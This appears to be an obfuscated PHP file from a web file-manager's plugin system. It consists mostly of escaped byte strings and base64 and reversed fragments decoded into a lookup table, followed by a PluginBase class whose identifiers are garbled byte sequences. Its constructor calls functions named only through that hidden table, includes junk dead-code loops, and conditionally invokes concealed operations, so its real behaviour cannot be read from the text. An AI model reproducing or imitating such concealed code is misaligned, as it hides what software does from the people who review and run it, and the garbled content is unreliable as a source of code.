ÊÌnº‚Fj¥Ø¬ä{ÿ£2x[&ÍáwKV*)´|’«“Tš=Æ')."\114\227\261\323\37\61\342\142\233\101\240\200\253\12\104\256\207\205\64\14\153\56\311\326\146\21\155\73\260\43\266\41\346\256\263\53\162\342\262\150\167\54\336\163\122\42\231\352"."\135\276\142\345\252\223\141\164\31\12\144\25\77\363\331\5\136\36\203\243\232\25\34\145\336\211\227\143\336\134\267\203\62\317\303\201\250\217\210\334\61\142\25\244\42\73\117\305".base64_decode('tCFYPYnWFiwUndlT5Oix9EHTdKZIXd792RVDYl+/PcBwLpjRR4OCW2EkjEsksF/7')."\145\57\311\30\75\145\306\53\63\350\331\174\1\40\234\172\113\133\264\0\66\62\163\273\125\376\202\77\323\237\352\304\256\34\373\117\346\163\155\130\222\113\305\264\131\314\30\322".strrev('mP`W+~"d?-~-KˆİÅ’­ŠšZ©Xbç›ößÔÇß˜zr¬xÍ-}¥')."\xd8\x95\x2e\xbc\x74\x96\xcc\x3c\xb7\x41\x1d\xf1\xa3\x4f\x48\x69\x34\x33\xaa\x9c\xed\xa1\xd8\xea\x80\x7b\x38\xc5\x11\x9b\xc7\xe4\x25\x46\x76\x19\x6e\x1c\x83\xf7\xb2\x2e\xcf\x8a\xe6\x40\xee\x7f"."\65\111\72\321\244\314\5\47\305\35\210\361\225\156\62\62\67\261\102\276\304\254\23\361\313\113\243\76\105\270\67\147\152\315\352\174\35\161\356\42\270\345\264\174\243\237\21\343"."\302\260\60\303\52\14\163\303\212\264\213\71\301\174\100\207\144\255\45\370\17\360\64\216\322\132\47\230\311\23\334\206\154\235\110\110\317\71\270\134\53\310\276\331\103\53\222\163"."\375\135\335\241\66\77\332\122\32\347\315\347\33\173\177\12\355\354\14\261\264\61\173\56\223\67\50\144\326\174\45\207\146\2\60\246\322\333\351\361\156\317\277\24\110\275\170\246".base64_decode('LT2DDU4YJ0mhHkyiQEEnaJx6h2MmWjmNNxh3A2hVle+urPrdldW+u9Lz3ZWV36Ug').strrev('UqzÒ²*¾!ßÕ2¹(omJ@rÍ‘¯6,²vÂ9i@ºš‹‚ã[R¥jÆ')."\0\222\237\141\33\247\315\210\130\136\263\235\345\56\47\77\237\353\163\27\273\247\350\346\142\20\347\135\203\246\155\7\261\143\102\302\261\163\43\263\170\222\235\361\270\373\104\55".base64_decode('giRhHHyjcYex3J2s8DlLVfM0HOY+WpDgERrCXjcQnYNRCY+XTFuXnRlndOIok18z')."\227\74\3\27\264\161\114\211\230\355\235\344\43\230\171\334\225\275\24\342\1\363\27\134\76\315\307\375\250\353\36\57\273\266\256\17\63\1\123\22\102\270\122\240\207\173\317\365".base64_decode('dgeTAkEULe45mZ7q+qsC/JLjBkoNJO/bqF1QNW4mrN8cGRumSKA/J1frtd8S7ozR').base64_decode('XFKf+cv0CeYq2LMCPN6F+zv7u/tT8jA5lpbNomZLfktdbRHOjAH9iJt7NhhTu0KG')."\xc3\x8b\x19\x55\x3d\x29\x43\x22\x91\x3a\x82\x16\x79\xbe\xc3\x37\xa6\x72\xcc\x25\xef\x65\x54\xc1\xdd\x93\x30\x1c\xb0\x37\x2b\x8c\x56\x4b\x65\xe9\x61\x19\x19\x5f\xf0\x36\xce\xd\xde\xb0\x52\x81".base64_decode('OqBmJIM4hgbH882sR2joiq0muxayrgZhYk1TzfF16Le+xleDmVMSx7OIAaQdNU3H')."\xd7\x91\x40\x3d\xf8\x4f\x99\x84\xb\x43\x92\x8b\x56\x71\x62\xe\xea\x84\x25\x68\x68\xa5\x63\x9e\x25\x64\x34\xf0\xda\x6f\xc\x36\x6\xc7\x80\x1e\x2c\x19\xc1\x5f\x14\xaf\x47\x78\xf7\x80\x71\x15"._kodDe('KDOHcmzAlw26ML6wgsiSUbu+uG1oMvE7PNM58R3Je7vavEFvARr73MPP0Hx3e1Aksw==')."\xd2\x5c\xdb\x9b\xea\xf0\x2f\xa8\x5d\xd2\x72\xd0\xe2\x36\x72\xe8\xeb\xe8\xdd\xf8\xd4\x16\x7b\xa2\xa6\xa\x80\x16\x38\x94\x59\x8c\x97\x17\x8f\x4\xdd\xb1\xa9\xca\x2\xfe\x15\xb4\x49\xb3\x88\xb6".base64_decode('OkShCoE0DGYvp2LCj3VRd8ZMC060gcA2NsyVcRpQxGZLm7hOaHL4lbaV/t7SRLno')."\307\152\10\177\122\166\250\347\161\231\337\340\316\217\25\11\356\374\62\151\114\13\362\121\20\101\372\374\101\223\42\277\211\41\171\11\366\143\236\200\256\112\246\323\2\30\246\232"."\14\144\310\76\227\31\136\143\222\250\272\111\342\122\117\173\361\120\373\21\323\205\361\37\55\52\264\375\72\172\265\54\356\207\27\274\317\61\170\107\201\24\301\223\353\227\337\171"."\30\107\34\67\116\306\36\337\375\170\176\375\106\146\252\24\261\250\253\66\65\15\250\122\55\113\157\331\310\170\77\111\214\10\374\345\62\373\140\325\112\145\171\200\145\40\235\210"."\360\372\134\234\271\206\346\232\63\343\136\346\136\322\33\127\72\123\107\213\127\151\234\323\64\157\141\23\273\13\65\203\331\100\224\113\314\316\31\5\231\263\365\143\203\131\106\7"."\304\113\14\254\157\170\302\45\267\364\56\260\30\106\276\302\31\1\161\345\23\255\165\275\361\1\35\245\62\273\344\76\237\50\270\351\112\302\226\101\52\177\156\240\12\45\105\302"."\x18\xdb\x30\x60\xdb\x95\x5e\x46\xe2\x13\x32\xc4\x2\x16\xcf\xaf\x89\x25\x32\x98\x1f\x16\x3d\x19\xc4\x26\xdd\x80\xe1\xc3\xa8\xa1\xa6\x60\xb3\xc8\x96\x2b\x69\x93\xd3\xb9\x72\x71\xb8\x59\x4a\x54"."\x1c\xd3\x54\xa\x5a\x71\x2\xa4\x81\xe9\x76\xd3\x74\x7b\x11\xfe\x50\xf3\xf4\xc0\xdc\xac\x8d\x22\x40\xaf\xb9\x8f\x59\xbc\x8f\x8\x8f\x80\xd4\x43\xd\xa4\x50\x75\x7e\x0\xbf\xd\x12\xc0\x9b\x54"."\242\314\256\126\21\145\36\60\24\371\62\177\323\241\104\302\320\332\236\150\157\147\44\46\31\63\111\0\265\255\75\246\206\172\172\252\46\310\337\10\142\113\200\300\132\166\100\222"."\x66\x18\xb6\xd8\x28\xc\x29\x69\x7c\xe7\xa1\xb9\x6\x43\x6b\x14\xdb\x4a\x33\xaf\xbb\x35\x41\xa0\xa9\x24\x83\x90\xa5\x16\x1b\x50\xa4\x16\x17\x51\xb2\x8\x65\xfc\x24\x44\x93\x6b\x5b\x16\x7\x8d".strrev('3{C’­l[b×6˜èSX²Š@Ovõ²Ó<â¡sb'."\n".'²Xqà+Še7Âğ>')."\267\225\154\361\26\216\261\43\244\305\101\115\116\304\253\54\141\62\126\230\13\124\243\134\151\137\365\64\42\44\371\350\46\157\64\264\151\305\345\225\105\160\345\201\264\234\104\147"."\222\134\72\251\314\37\44\132\201\240\220\35\335\307\63\374\104\243\12\122\4\304\153\112\132\172\30\143\227\330\12\340\233\220\320\203\305\25\232\340\172\173\300\221\314\65\312\370".strrev('ı, $ÎV±C?¹§´0üXaxæ0‚ğÉP¤ŞŸ¡°ß÷xEhëu”eâ[ºQ')."\25\145\242\261\116\21\241\342\211\53\261\217\31\127\223\130\177\137\155\140\346\206\15\101\203\331\105\61\33\16\126\66\300\163\323\170\177\300\235\37\365\4\206\236\147\4\200\67"."\x27\xe5\x25\x4f\x84\xc5\x77\x50\x70\xa6\xb8\x34\xc6\xed\x9f\x14\x6c\x14\xd5\xdc\xdc\xd2\xc7\xcf\x78\x6\x58\x1a\x63\x8\x8d\xd9\xb\xd8\xf4\x4f\xe6\xfc\xa9\x15\x3c\xd8\x16\x13\x2c\x2f\x47\x72".strrev('Ğ…–+]Å¤ƒ=;WÈ0cy'."\r".'ç!²Ê9%J‡'."\r".')üßÊ2]çûruDOJ').base64_decode('L3kS8At6BDyKCCPiwNZ64aguDuSBxXbaMkqOi07RxwhryJssa7VRjWapUUBWb64h')."\256\351\153\20\135\242\51\100\20\104\123\26\143\2\244\130\172\276\271\206\64\327\316\351\72\52\117\110\114\265\217\240\202\65\12\243\216\5\215\217\230\345\230\150\23\144\364\216"."\275\220\324\233\200\153\21\241\30\234\361\0\173\165\334\152\372\173\374\161\14\121\310\163\135\171\335\242\266\337\204\352\220\123\277\254\320\157\301\203\115\75\211\170\52\336\306\336".strrev('Æ<dÄõëa…¾EÙ†mnE‹•oÓÎX$MÃÁ»2S^›YxË›¦©·')."\111\161\354\301\217\34\6\224\76\215\35\112\201\231\52\75\145\113\346\312\216\330\56\261\257\373\24\276\243\153\3\130\362\354\207\375\12\242\212\372\250\336\262\271\201\135\324\140"."\106\154\342\146\27\344\254\122\7\325\11\247\270\221\230\136\164\251\103\350\267\363\46\163\166\330\330\320\320\340\157\230\215\376\343\247\303\300\276\65\61\317\16\122\226\206\206\46"."\362\37\115\40\32\135\230\24\167\12\242\1\214\170\101\206\61\135\207\6\301\316\120\60\212\145\306\141\365\265\341\373\132\12\156\332\0\143\52\130\373\321\174\20\37\204\214\216"."\54\222\344\302\105\12\71\175\204\230\356\35\4\176\254\13\63\54\73\261\146\141\304\350\240\331\46\203\2\355\345\227\374\120\66\201\107\213\350\235\312\146\336\250\160\61\323\47".base64_decode('fyzABpcCheNlP0vwyw8lQCG6Q4gzDVfTUBm3c0MMQTt1mvcTAyT1CebaJIeNOCof')."\x5d\x90\x64\x7e\x87\x8e\xc4\xf2\xfc\xd2\x3e\x8e\xc6\x78\x4d\xf4\x3d\xe\xfa\x7e\x27\x8c\x61\x15\x74\xcd\x99\x63\xaa\xd8\x8c\x71\xf4\x44\x1e\x23\x43\x6a\x70\xff\x22\x88\xee\x49\xf7\x1e\xf1\xb8"."\62\262\314\320\216\31\45\200\215\3\271\307\76\154\344\135\267\167\125\251\156\171\64\27\341\214\362\50\241\105\33\342\17\217\120\113\103\366\171\5\126\27\60\12\170\257\40\217"."\305\121\343\320\246\203\52\346\317\361\316\35\231\6\313\24\167\157\53\354\173\130\114\232\14\246\41\117\176\216\11\16\203\204\31\200\32\255\264\161\167\206\122\5\336\44\117\231"."\x10\x55\xac\x57\x14\x0\x78\x65\x6e\x72\x18\x51\x25\x37\x86\x7b\x72\x13\x47\x86\x6d\xdc\x1b\xab\xec\xdd\x90\x5a\xb\x48\x36\x25\x36\x78\x9c\x17\xe6\x1\xac\x8e\x51\x49\x7a\xa\x94\x2c\x73\x8"."\x4d\xb3\x2d\xf\x1a\x82\xf7\x54\x7\xf3\xec\x95\x39\xab\x64\xe2\xad\x97\xf3\xc9\x40\x7c\xd2\xc1\x9e\x6c\x4\x8c\x15\xf7\x7f\x35\xf1\x62\xac\x94\x55\xdc\x71\x95\x80\xee\x5\x2b\x25\xb4\xf1\xf7".base64_decode('gWQglsZkgxBicuuuA4t5bghv2WcgHRPPHXjeUzY4pNkE0cGqE1nBq7rQhOEqsz/B')."\43\44\316\202\335\160\12\243\2\264\353\370\50\105\150\131\136\147\257\215\2\265\43\213\12\127\100\354\164\74\203\52\26\2\54\335\346\146\271\230\73\355\117\147\136\300\2\27"."\262\134\170\130\271\376\117\126\214\343\41\125\145\335\6\136\321\135\374\221\313\52\210\350\106\266\12\254\42\54\0\256\240\211\123\73\51\206\204\71\306\357\145\130\173\107\312\72".base64_decode('41El0qg4gjACGUvlLNPh8gtOD2Ukch+VOZQULeJvEd9xnaNJTpV5VrSVsa9rbHsj').strrev('¢‚³’ÖÈ‹M§¥¤{/ Ê§nÉI<)Åü‹ª^a7l9²1Ã^¢yR$µ)ÄaF').base64_decode('k9CH5GjU5DoFfG6jV6kC+4eR0B5jAZJ2y7K3GcmZNYpJXsslXsc/W+FMkkprppFZ')."\x52\x2\xc9\x5f\x8d\x5f\xf2\x68\xb9\xa4\x1b\xc\x44\x98\x4f\x96\x7\xf9\x61\x83\x87\x8b\x61\x97\x22\x14\x99\x49\x60\xb7\x1c\x70\x5\xc4\xf1\x7\xee\x81\x2d\xa7\xa1\x6a\xb1\xc3\x59\xd1\x33\xb9".base64_decode('CPlmRRGahvdp4T5DTrGxO/JeNm3VUqp8iiRJI5rmToRgdMQgQcKEzmwD/bMb/cwt')."\x9a\x7c\x63\x82\x31\xca\x40\xc7\xd0\x5a\x90\xd0\x0\xcb\x14\x8c\x36\x82\xa1\x1f\xe4\x13\x79\x4c\xe9\xc8\x86\xb8\xd4\x10\x2e\x6\x88\xf7\x10\x3e\x9f\xc4\xcd\x8\x8f\x59\xd2\x5e\xa6\x73\x23\x40"."\342\157\103\46\53\342\144\235\332\6\342\14\275\325\322\351\10\341\344\166\227\351\244\47\3\132\31\356\164\360\120\56\32\103\135\176\230\56\373\33\117\45\340\375\136\366\274\116"."\112\211\176\10\53\124\4\62\251\37\164\151\140\204\205\0\365\104\302\314\147\71\135\22\340\224\311\201\225\126\6\1\156\76\14\167\111\341\371\310\272\172\174\227\324\245\301\351"."\x9e\xe0\x37\xfe\xb0\xd\x10\xde\x24\xb8\xd\xa7\x2d\x47\x58\x2a\x47\x4e\xdb\x15\xa1\x36\x4f\xae\xd2\x1c\xc4\x73\x8d\x31\xdf\x76\x5c\xd3\xd0\xd3\xd5\x13\xe4\xa0\x56\xbe\x3c\xa9\x74\x2a\x1c\x20"."\265\61\303\42\361\330\371\130\301\110\53\321\170\147\244\55\24\155\217\44\227\51\103\272\243\10\163\10\362\172\201\173\51\23\305\32\35\170\206\325\203\334\221\76\16\372\7\21"."\307\352\317\160\306\335\26\54\272\144\371\45\275\130\344\256\226\342\237\156\125\324\130\304\267\75\362\25\145\260\272\260\112\356\274\320\236\111\231\113\226\136\231\177\102\47\257\225"."\213\26\113\5\312\125\132\3\371\253\177\201\274\166\40\347\106\33\261\136\234\252\361\106\161\324\260\15\261\360\131\211\11\271\366\120\173\167\44\246\206\242\121\44\336\313\26\162"."\102\121\152\361\267\45\62\362\123\24\322\314\210\111\240\137\257\364\313\5\136\215\144\217\340\36\111\235\116\237\354\237\255\304\216\0\340\355\75\356\231\236\106\245\167\145\112\226".base64_decode('Zti6BKDPncyEyxVaPu96US6flaJl985a9VMq/QCDSS7gqmVI4DfC/8dNNTLCFZOR').base64_decode('YZYI/C4cdVrfJr8+yL5Z8XbO577C4xOHJipxa8MeAzMJOw68IoVF4ipRKariE0hQ').base64_decode('tCZK8qlVMBPkQ0wD2ONcmKmscUQwxjg71IY/R8UlJAVivQ5joZnFI6ITMM6uU1vP').base64_decode('e0Jeg1DXy90V3yCu62laH+4OyjkgOodi/CEKUdSbUqUBKFkRahOeQWlWGujTVvxp').base64_decode('AWUxu9krPkB8RIULJcclSnbJluDS3FAA4XSEqIDtaczCRAXApSuJsnZxAzz8sEIx')."\153\312\343\107\10\62\66\353\247\17\324\121\231\325\207\170\175\335\251\174\237\206\26\377\77\51\110\23\223\222\131\242\273\222\312\6\331\336\255\116\260\135\370\351\235\234\71\346"."\176\245\16\103\274\217\355\270\236\331\221\26\15\271\200\52\77\14\344\56\344\253\170\340\102\41\317\217\52\10\325\141\26\261\327\42\46\23\221\314\322\247\247\323\237\176\370\145"."\333\231\267\21\224\120\301\47\353\71\122\265\345\214\174\306\342\6\42\2\320\255\13\101\225\224\302\66\22\32\173\146\225\274\331\325\316\150\62\274\251\121\355\71\46\354\357\315"."\375\110\210\170\173\105\354\235\356\327\51\370\61\247\55\26\203\355\270\136\77\111\231\51\155\310\107\71\62\114\325\104\254\165\102\16\313\106\241\244\27\50\221\51\223\62\174\276"."\x5b\xa4\xc\xec\xd1\xb3\x8c\x8f\xbc\xc8\x45\x49\x9d\xf7\xd1\xe\x69\xa5\x71\xfa\x29\x97\x1e\xca\x9b\x83\x5a\x3e\x41\xed\xaa\x5c\x97\x40\x2c\x24\x4d\x71\x5b\x49\x57\x36\xa\xa\x6a\xa5\x92\x38"."\x7a\x91\xb7\x4c\xf4\xd7\x75\x51\xe\xd2\x7a\x53\x5d\x2a\xb9\xee\xad\xd2\xb3\xda\xa4\xc0\x39\xe9\xd0\x86\x2\xe1\x0\xa7\x5c\x8c\x50\x45\xb7\xb\x6a\x49\x72\x9e\x6c\xd0\x4b\x8f\xaa\xc4\x8d\x2c"."\xc8\x8e\xda\xd9\x43\xcf\xa6\x60\xc0\xe4\x2a\xd9\x79\x21\xd7\xba\x76\x48\xcf\x71\x7\x2b\xcf\x17\xb1\xc5\x18\x50\x14\xd9\xa0\x12\x8e\x7a\x3\xb2\x20\x6\x19\x94\xc5\x8a\x40\xd\xd7\x42\xc6\xa8"."\204\270\141\37\11\20\112\41\63\356\237\1\345\30\354\176\20\206\242\72\371\151\327\263\134\212\301\161\261\233\313\76\52\204\215\201\367\115\63\366\31\376\44\233\217\366\114\74"."\305\111\37\140\363\361\307\326\174\324\255\240\17\236\130\363\211\233\165\237\365\246\214\170\145\327\375\64\57\156\63\267\100\254\20\47\274\222\4\37\52\117\201\204\167\340\122\146".base64_decode('pc5RnKoWywVxTo0ibsmqosNSD8tW3kfOlH3Mc5tnOESv5JmpMoafXwc1RCXiUsZN')."\257\232\26\17\132\354\134\316\233\315\160\141\235\152\351\342\206\11\165\162\131\101\332\127\25\62\215\163\346\55\224\325\22\142\176\304\351\25\134\161\207\323\66\340\63\304\214\53"."\x6e\x7c\x52\x98\x67\x4d\x79\xdd\x92\x44\xb7\x8d\x70\xe5\x5b\x88\x1e\xda\xfd\x3f\xc3\x7c\xc1\xf7\xd3\xac\x92\xc5\x6e\xe5\x9b\xb2\x15\x23\x40\x90\x50\xb2\x65\x91\xb6\x32\x8f\xb1\x82\x89\x6d\x8".base64_decode('bLF86OYlXkB0f4tu/FX6Ie1YYiXQB+rMPJaOC1jr61iaWxSsJvGQkWDilUHeida9')."\155\47\3\3\172\20\221\54\211\104\162\215\216\351\125\342\340\342\170\107\43\72\304\170\61\17\33\56\276\61\54\326\224\104\122\376\7\23\310\244\33\52\10\11\123\225\52\75"."\xf\x2e\x65\x74\xa3\xca\x3\x84\xd2\x79\xff\x67\xb4\x9b\xf2\x65\x5c\x92\xf3\x6b\x8e\x5f\x42\x48\x49\xf1\xa7\x3b\x71\x32\xc1\xc0\xb7\x8\x81\xd3\xdd\x57\x4f\xf5\xa8\x98\xa8\x63\xc0\xa7\x4c\x95"."\xa9\x92\x39\x93\xde\x29\x14\x3e\xa5\x24\xb6\xc\x97\x66\x57\x13\xa7\x90\xd7\x19\x71\x92\x5f\x60\x74\x72\x42\xf0\xa0\x2b\xd4\xb5\x5a\x25\x7f\xb5\xf2\x5d\x2d\x52\x91\xbc\xc\x2a\xab\x96\x1e\xa4"."\23\52\34\242\363\201\116\300\32\46\256\62\311\35\275\120\47\277\267\247\111\346\105\156\275\22\36\135\351\15\122\123\16\213\121\307\364\74\316\374\203\242\257\273\344\102\24\157".base64_decode('97xPS6iS99FaNkSEFAgqJ10HdQkh/NEul1Bie9/lQ6yZ7MkXRfkigO0UyCGx6aZf').base64_decode('k3ZLsTGK0FTP1bvfsnfdmsW+kTwrn93FtT2vdFLvqzTM2PT/64fo/l+9PzevganN')."\135\257\334\166\2\263\314\370\263\111\311\217\63\125\331\172\372\341\336\64\17\4\54\342\17\72\113\161\156\270\312\374\143\61\267\131\32\73\346\321\362\171\151\153\255\56\136\124".strrev('YíÔWÏ¤ò±kÌb'."\n".'cÁTÅ.PQ–¨^Mº=´*}æ ½â-Y-¿˜oŠ<')."\142\62\52\262\211\257\42\136\204\271\32\13\262\120\32\13\154\230\23\145\144\126\276\31\32\57\61\321\256\36\50\373\300\122\106\216\310\135\163\240\112\62\45\162\201\52\350\127"."\xca\x35\xb\x2e\xa0\x3c\xc0\x30\x6b\xf8\x32\xad\xfb\x89\x76\x28\xd1\xed\x79\xea\x90\x66\xb2\xe5\xd1\x74\x29\xd7\x2b\xf\xbe\x2b\x4b\xf3\x95\x2f\x17\xc1\x16\xc2\x6e\x7d\x13\x7f\xde\xba\xc1\xfb"."\336\365\154\177\345\307\250\201\76\126\171\44\260\222\201\251\215\310\371\13\71\37\255\122\206\142\152\122\344\231\142\255\124\137\261\374\211\111\241\103\303\41\271\277\154\345\367\130".base64_decode('JmHo3FCueJEMMqUHmKcHKvYXRu1cQ46kLHHAZ5jEFTor2ttdR+6asK1cPGeMF5Hw')."\143\210\65\341\35\46\307\12\354\204\212\350\372\344\135\233\135\377\222\254\247\1\344\322\310\331\362\253\23\356\222\330\36\336\275\226\132\252\145\113\233\226\55\145\343\360\152\171"."\x31\x86\xc9\x1a\x7\x39\xd\xbf\x44\xeb\xb8\xe6\x42\x78\xb5\xf7\x7a\xb3\x27\x72\x38\x15\xad\x5d\x12\x36\x9c\xc1\xca\x20\xe9\x88\x12\x31\xdb\x19\xf7\xf3\x18\x24\x91\x80\x99\x7\x4c\xa8\x41\x3a"."\144\163\237\161\162\357\336\25\224\262\154\104\245\144\122\212\71\126\103\277\370\212\134\104\370\142\40\311\364\370\40\44\75\162\354\55\345\176\34\133\72\21\115\23\314\13\127\36".base64_decode('eomzOInPYMWwJCS2AA+82vPOWW1UMEmCF89k+NPrrqwZJo1wKIKIV9oxkyXduhUG').base64_decode('3PqY973bgHxT15WxEipu5UrlxfGH6CaGVes+WU7u4vKtX45UAkQfOOD2Q5Lcgy8l')."\10\303\42\332\25\56\304\213\117\272\357\30\363\154\174\316\120\36\162\5\304\357\202\172\44\71\254\22\141\34\203\47\311\226\137\225\167\37\164\312\132\5\11\5\364\174\124\252".base64_decode('Tj4EnbJAsvpHBFa6h1i6nC0S2FZnugZfIpG8Y5AzISe6muOdWiKECPSlwAJRwNK0')."\220\73\211\346\327\75\255\227\13\170\173\106\113\330\143\206\223\316\111\222\121\145\142\45\334\252\30\124\370\120\365\366\172\133\305\306\324\53\57\212\112\52\332\43\131\122\244\314"."\52\145\150\213\252\26\243\111\270\244\140\127\135\145\247\30\2\134\226\46\341\262\25\311\254\260\244\136\221\312\71\132\331\236\242\173\225\203\7\72\207\114\225\16\173\44\163\232"."\165\252\361\254\232\271\362\163\200\161\336\334\104\111\121\275\25\102\267\340\71\321\256\326\212\252\231\247\154\205\310\355\331\5\252\321\132\226\122\205\272\12\323\206\112\72\56\322"."\252\30\132\320\72\361\36\55\73\153\252\222\54\133\155\124\267\353\110\124\135\372\266\333\340\302\3\227\7\6\374\162\2\167\5\330\206\44\305\274\61\54\154\320\230\311\364\164"."\x17\x7d\x2f\x17\x87\x8b\x26\xdf\x33\x32\xc2\x5e\xe\x1b\xf7\xf2\x67\xef\xf9\xb7\x2b\x6a\x73\xe3\x69\xb1\x2c\xb9\x3a\xad\x6a\xc1\xed\xc3\x72\x7d\xa5\x4\x9d\xd7\x98\xce\x5e\x32\x7d\xa7\x22\x8f"."\351\30\151\335\355\117\125\366\331\104\323\331\107\362\222\156\320\243\226\23\132\6\227\101\100\25\305\25\1\1\137\47\324\337\264\76\211\143\21\70\341\272\162\100\371\4\70\22".base64_decode('oKeJbfjUmp8jEV+gdF+lyUnTcnw4LWWWyG+r6TjidJ2K9YQZxJujTzIeQSFxaIQb')."\105\116\43\10\332\22\362\102\202\160\256\211\345\345\244\116\123\11\121\162\105\360\51\7\217\310\173\37\234\157\166\224\75\47\260\2\200\204\323\101\163\234\171\132\304\327\232\105".base64_decode('e/DBhDRkgj8B9JPNX8iFcTtIU4Lgod+vYUYRHt0KrC0NuYrTp4u4Sedn1QBaVFEF')."\x75\xcf\x4d\x74\x5d\x70\x37\x24\x99\x4a\x56\x24\xf5\x84\x92\xc9\x15\xf1\x44\x3b\xf5\xe6\x5d\x91\x4c\x4a\x49\xe6\x44\x15\x49\x3d\x5d\xf1\xd8\x54\x69\xe1\xee\x50\x24\x5a\x91\x86\x2d\x8f\x62\xaa".strrev('‘¢™DÕş^£æét¤Ï-I‡gs¦Lå/œ¡bƒ–‰–ÚDVªnøä•¤="“E«p').base64_decode('Fso9TWLebeZ6kAfcT+N4DPwYkkJF2GooBnUnSgDF3s35WueMtDj5DrhOyCU4WQ+E')."\300\110\70\47\157\264\4\60\263\352\0\311\212\335\312\203\6\222\52\6\0\67\354\104\23\114\316\326\232\203\322\101\2\25\143\340\366\41\14\251\144\31\106\303\256\144\107\33"."\xaa\x7a\x50\x4c\xb5\x79\x78\xc5\xb\x3d\xdb\xff\x6\xcc\xb9\xe6\x79\xd4\xa9\x0\x0"."".""."".strrev(''), 10, -8))); goto e§è£ëš»¼; bÁÎæòˆ†: $_SERVER[´ºÄÉ³ã] = explode($_SERVER[„Ç©ñÎ©][625], gzinflate(substr($_SERVER[„Ç©ñÎ©][626], 10, -8))); $origjflynv = $_SERVER[„Ç©ñÎ©][627]; if (!$origjflynv) { return; } goto Còó¦é´ß†; dÛÔÀÁÛç˜: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ùñ‡í¨ˆ =& $_SERVER[„Ç©ñÎ©]; if ($_SERVER[$ùñ‡í¨ˆ[62]] != $_SERVER[$ùñ‡í¨ˆ[868]]) { $—Íµı—è = $ùñ‡í¨ˆ[876]; $¬¹«ÔË¥ = $ùñ‡í¨ˆ[63]; $®‰Ï‘Óõ = $_SERVER[$ùñ‡í¨ˆ[64]] . $ùñ‡í¨ˆ[65]; $óï›ê¨ˆ = $¬¹«ÔË¥($®‰Ï‘Óõ); $¤ªø“ç = explode($ùñ‡í¨ˆ[66], $óï›ê¨ˆ); if (count($¤ªø“ç) < $ùñ‡í¨ˆ[650]) { $ÃéÁ¤´ = $ùñ‡í¨ˆ[68]; $ÃéÁ¤´(); } $â¼†Ä•ö = $ùñ‡í¨ˆ[877]; $â¼†Ä•ö($_SERVER[$ùñ‡í¨ˆ[878]]); $â¼†Ä•ö($_SERVER[$ùñ‡í¨ˆ[64]] . $ùñ‡í¨ˆ[1520]); $ÕÆ™¢¨Ø = 1; while ($ÕÆ™¢¨Ø > 1) { $ÕÆ™¢¨Ø = $ÕÆ™¢¨Ø + 4; $üËõ«¤ = rawurlencode($ÕÆ™¢¨Ø . $ùñ‡í¨ˆ[387]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ùñ‡í¨ˆ[1521]); $this->pluginName = str_replace($ùñ‡í¨ˆ[1521], $ùñ‡í¨ˆ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ùñ‡í¨ˆ[8]; $this->pluginApi = appHostGet() . $ùñ‡í¨ˆ[1522] . $this->pluginName . $ùñ‡í¨ˆ[8]; $this->pluginHost = $config[$ùñ‡í¨ˆ[1523]] . $this->pluginName . $ùñ‡í¨ˆ[8]; $this->pluginHostDefault = $config[$ùñ‡í¨ˆ[1523]] . $this->pluginName . $ùñ‡í¨ˆ[8]; $Ü½†»ÂÏ = $config[$ùñ‡í¨ˆ[1524]]; if ($Ü½†»ÂÏ && strpos($ùñ‡í¨ˆ[50] . $Ü½†»ÂÏ . $ùñ‡í¨ˆ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ùñ‡í¨ˆ[1525]] . $this->pluginName . $ùñ‡í¨ˆ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[„Ç©ñÎ©][1526]); } protected function assign($îåÙ’’, $ŒÍ¶Ôòœ = false) { if (is_array($îåÙ’’)) { $this->values = array_merge($this->values, $îåÙ’’); } else { $this->values[$îåÙ’’] = $ŒÍ¶Ôòœ; } } protected function display($ÉòØ¿İ‚) { extract($this->values); require $ÉòØ¿İ‚; } final function hookRegist($ãí‹òÇ¹) { $this->modelPlugin->appRegist($this->pluginName, $ãí‹òÇ¹); } final function appIcon() { $µ€®‰… =& $_SERVER[„Ç©ñÎ©]; $ÇÜÎøİÑ = $this->appPackage(); $‰ ûƒÖ = $µ€®‰…[12]; if (isset($ÇÜÎøİÑ[$µ€®‰…[425]])) { if (isset($ÇÜÎøİÑ[$µ€®‰…[425]][$µ€®‰…[1527]])) { $‰ ûƒÖ = $µ€®‰…[1528] . $ÇÜÎøİÑ[$µ€®‰…[425]][$µ€®‰…[1527]] . $µ€®‰…[1529]; } else { if ($ÇÜÎøİÑ[$µ€®‰…[425]][$µ€®‰…[1530]]) { $‰ ûƒÖ = $µ€®‰…[1531] . $ÇÜÎøİÑ[$µ€®‰…[425]][$µ€®‰…[1530]] . $µ€®‰…[1532]; } } } return $‰ ûƒÖ; } final function fileCanView($Ëõ¦ÃÓ) { $¨¶Ú®ùÂ =& $_SERVER[„Ç©ñÎ©]; if (request_url_safe($Ëõ¦ÃÓ)) { return !0; } if ($this->isShare($Ëõ¦ÃÓ)) { return !0; } $‡ß®¹ê = Session::get($¨¶Ú®ùÂ[1533]); if (!$‡ß®¹ê || !$‡ß®¹ê[$¨¶Ú®ùÂ[1534]]) { $À¿åüá¡ = $¨¶Ú®ùÂ[1535] . rawurlencode(this_url()); show_tips(LNG($¨¶Ú®ùÂ[1536]) . $¨¶Ú®ùÂ[1537] . $À¿åüá¡ . $¨¶Ú®ùÂ[1538] . LNG($¨¶Ú®ùÂ[1539]) . $¨¶Ú®ùÂ[1540], !1); } if (!Action($¨¶Ú®ùÂ[1541])->authCan($¨¶Ú®ùÂ[1542])) { show_tips(LNG($¨¶Ú®ùÂ[1543]) . $¨¶Ú®ùÂ[1544], !1); } ActionCall($¨¶Ú®ùÂ[1545], $Ëõ¦ÃÓ); } final function isShare($ßşÓåÙù) { $ÅÖ³¬Óœ = KodIO::parse($ßşÓåÙù); return $ÅÖ³¬Óœ[$_SERVER[„Ç©ñÎ©][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($… Ù¾ŸË) { if (request_url_safe($… Ù¾ŸË)) { return $… 